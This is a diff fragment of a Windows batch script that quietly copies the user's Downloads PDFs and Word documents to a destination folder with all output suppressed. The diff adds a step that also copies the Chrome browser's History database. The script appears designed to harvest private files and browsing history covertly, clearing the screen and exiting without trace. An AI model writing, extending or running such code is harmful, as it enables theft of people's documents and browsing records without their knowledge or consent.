@@ -33,5 +33,9 @@ xcopy /C /Q /G /Y %USERPROFILE%\Downloads\*.pdf %dst% >>nul
 xcopy /C /Q /G /Y %USERPROFILE%\Downloads\*.docx %dst% >>nul
 )
 
+if Exist %USERPROFILE%\AppData\Local\Google\Chrome\ (
+xcopy /C /Q /G /Y "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History" %dst% >>nul
+)
+
 @cls
 @exit
